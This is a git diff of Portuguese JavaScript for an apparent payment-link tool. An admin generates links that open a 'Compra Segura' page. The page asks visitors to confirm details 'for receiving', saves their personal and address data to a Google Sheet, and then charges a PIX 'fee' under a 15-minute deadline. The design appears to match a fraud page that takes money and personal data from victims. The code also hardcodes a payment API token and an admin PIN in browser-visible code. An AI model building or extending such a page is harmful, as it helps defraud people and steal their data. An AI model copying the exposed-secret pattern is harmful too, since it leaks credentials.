@@ -1,11 +1,13 @@
 // ========================================================
 // ⚙️ CONFIGURAÇÃO CENTRAL
 // ========================================================
+// Substitua pela URL do seu novo Backend unificado (o que acabamos de criar)
 const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbw0tZ66QIzYiGsD2XNyX9I3dv5r5zfAqPDywPTrRXYJsNsbeJS9Mlo_GdIdynl9p8EwqQ/exec'; 
 const BASE_URL = window.location.href.split('?')[0]; 
 const ADMIN_PIN = "0007"; 
 
 // Configuração da API Invictus Pay
+// ⚠️ NOTA DE SEGURANÇA: Idealmente, esta chamada deve ir para o Backend no futuro.
 const API_INVICTUS_TOKEN = "wsxiP0Dydmf2TWqjOn1iZk9CfqwxdZBg8w5eQVaTLDWHnTjyvuGAqPBkAiGU";
 const API_INVICTUS_ENDPOINT = "https://api.invictuspay.app.br/api";
 const OFFER_HASH_DEFAULT = "png8aj6v6p"; 
@@ -19,18 +21,21 @@ document.addEventListener('DOMContentLoaded', () => {
   const viewAdmin = document.getElementById('admin-view');
   const viewClient = document.getElementById('client-view');
 
+  // 1. Se tem ID na URL, é Cliente (Checkout)
   if (params.has('id')) {
     showView(viewClient);
     initClientApp(params.get('id'));
     return;
   }
 
+  // 2. Se tem sessão salva, é Admin logado
   if (localStorage.getItem('admin_session_active') === 'true') {
     showView(viewAdmin);
     initAdminApp();
     return;
   }
 
+  // 3. Caso contrário, Tela de Login
   showView(viewLogin);
   initLoginApp(viewLogin, viewAdmin);
 });
@@ -82,12 +87,14 @@ function initAdminApp() {
   const toggleIcon = document.getElementById('toggle-icon');
   const moneyInputs = document.querySelectorAll('.money');
 
+  // Toggle dos campos visuais
   toggleHeader.addEventListener('click', () => {
       const isExpanded = fieldsContainer.classList.toggle('expanded');
       toggleIcon.classList.toggle('rotated');
       fieldsContainer.style.maxHeight = isExpanded ? fieldsContainer.scrollHeight + "px" : "0";
   });
 
+  // Formatação de Moeda (Input Mask)
   const formatMoney = (value) => {
     value = value.replace(/\D/g, "");
     const amount = parseFloat(value) / 100;
@@ -98,6 +105,7 @@ function initAdminApp() {
     input.addEventListener('input', (e) => e.target.value = formatMoney(e.target.value));
   });
 
+  // Submit do Admin (Gerar Link)
   form.addEventListener('submit', async (e) => {
     e.preventDefault();
     btnSalvar.textContent = "Gerando...";
@@ -139,11 +147,12 @@ function initAdminApp() {
 }
 
 // ========================================================
-// 🛍️ CLIENT APP (CORRIGIDO: Conversão de Valores)
+// 🛍️ CLIENT APP (CHECKOUT)
 // ========================================================
 async function initClientApp(id) {
   const containerArea = document.getElementById('client-content-area');
 
+  // Utilitários de Formatação
   const formatValueForClient = (value) => {
       if (!value) return ''; 
       let valueStr = String(value).trim();
@@ -161,24 +170,11 @@ async function initClientApp(id) {
       return isCurrency ? `R$ ${formatted}` : formatted;
   }
 
-  // 🔥 FIX CRÍTICO: Conversão Robusta de Moeda para API
   const parseMoneyToCents = (val) => {
     if (!val) return 0;
-    
-    // Caso 1: O Google mandou um número puro (ex: 20)
-    if (typeof val === 'number') {
-        return Math.round(val * 100);
-    }
-
+    if (typeof val === 'number') return Math.round(val * 100);
     let valStr = String(val).trim();
-
-    // Caso 2: String numérica sem formatação BR (ex: "20" ou "20.50")
-    if (!valStr.includes(',') && !valStr.includes('R$')) {
-        return Math.round(parseFloat(valStr) * 100);
-    }
-
-    // Caso 3: Formatação BR (ex: "R$ 20,00" ou "20,00")
-    // Remove tudo que não é dígito -> "2000"
+    if (!valStr.includes(',') && !valStr.includes('R$')) return Math.round(parseFloat(valStr) * 100);
     const clean = valStr.replace(/\D/g, '');
     return parseInt(clean, 10);
   };
@@ -196,6 +192,7 @@ async function initClientApp(id) {
   }
 
   try {
+    // 1. Busca dados do pedido no Google Sheets
     const response = await fetch(`${BACKEND_URL}?id=${id}`);
     const json = await response.json();
 
@@ -208,13 +205,14 @@ async function initClientApp(id) {
     const dados = {};
     Object.keys(dadosBrutos).forEach(key => dados[key.toLowerCase()] = dadosBrutos[key]);
 
-    // Dados para API
+    // Prepara valores
     const valorCobrancaStr = dados.taxa || "R$ 0,00";
     const valorEmCentavos = parseMoneyToCents(valorCobrancaStr);
     const prazo = dados.prazo || '15 minutos';
 
     containerArea.innerHTML = '';
 
+    // 2. Monta a Interface
     const container = criarElemento('div', { class: 'client-container' });
     const imgHeader = criarElemento('div', { class: 'header-image' });
     const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura' }); 
@@ -279,7 +277,7 @@ async function initClientApp(id) {
             </div>
         </div>
 
-        <button type="submit" id="btnPay" class="btn-pay" style="width: 100%; margin-top: 20px; padding: 15px; background-color: #00bfa5; border: none; border-radius: 8px; color: #fff; font-weight: bold; font-size: 16px; cursor: pointer;">
+        <button type="submit" id="btnPay" class="btn-pay">
             Confirmar Dados para Recebimento
         </button>
         <p id="msgEnvio" style="text-align:center; font-size:12px; margin-top:10px; opacity:0.7;"></p>
@@ -294,12 +292,13 @@ async function initClientApp(id) {
     container.appendChild(criarElemento('div', { class: 'footer' }, '&copy; 2025 Plataforma Segura. Todos os direitos reservados.'));
     containerArea.appendChild(container);
 
-    // LÓGICA DO FORMULÁRIO
+    // 3. Lógica do Formulário e ViaCEP
     const form = document.getElementById('checkoutForm');
     const btnPay = document.getElementById('btnPay');
     const inputCep = document.getElementById('inputCep');
     const msgEnvio = document.getElementById('msgEnvio');
 
+    // Auto-preenchimento de Endereço
     inputCep.addEventListener('blur', async () => {
         const cep = inputCep.value.replace(/\D/g, '');
         if (cep.length === 8) {
@@ -320,21 +319,42 @@ async function initClientApp(id) {
         }
     });
 
+    // 🚀 SUBMIT: Salva na Planilha + Gera PIX
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       
-      msgEnvio.textContent = "Validando segurança e gerando link...";
+      msgEnvio.textContent = "Validando e salvando dados...";
       msgEnvio.style.color = "#00bfa5";
       
       const formData = new FormData(form);
       const customerData = {};
       formData.forEach((value, key) => customerData[key] = value);
 
+      // Defaults de Endereço para API Invictus
       if(!customerData.street_name) customerData.street_name = "Rua Geral";
       if(!customerData.neighborhood) customerData.neighborhood = "Centro";
       if(!customerData.city) customerData.city = "São Paulo";
       if(!customerData.state) customerData.state = "SP";
 
+      // 💾 1. Salvar na Planilha (Aba Cliente)
+      try {
+          const sheetPayload = {
+              action: "salvar_cliente", 
+              id: id,                   
+              ...customerData           
+          };
+
+          // Dispara salvamento (sem travar fluxo de erro fatal)
+          await fetch(BACKEND_URL, {
+              method: 'POST',
+              body: JSON.stringify(sheetPayload) 
+          });
+      } catch (sheetErr) {
+          console.error("Aviso: Não foi possível salvar na planilha, seguindo para pagamento.", sheetErr);
+      }
+
+      // 💸 2. Gerar PIX na Invictus
+      msgEnvio.textContent = "Gerando link seguro...";
       const payload = {
         "amount": valorEmCentavos, 
         "offer_hash": OFFER_HASH_DEFAULT, 
@@ -368,7 +388,7 @@ async function initClientApp(id) {
 async function executeInvictusApi(method, path, payload, button, msgElement) {
     const originalText = button.innerHTML;
     button.disabled = true;
-    button.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Gerando link seguro...`;
+    button.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Processando...`;
 
     try {
         const response = await fetch(`${API_INVICTUS_ENDPOINT}${path}?api_token=${API_INVICTUS_TOKEN}`, {
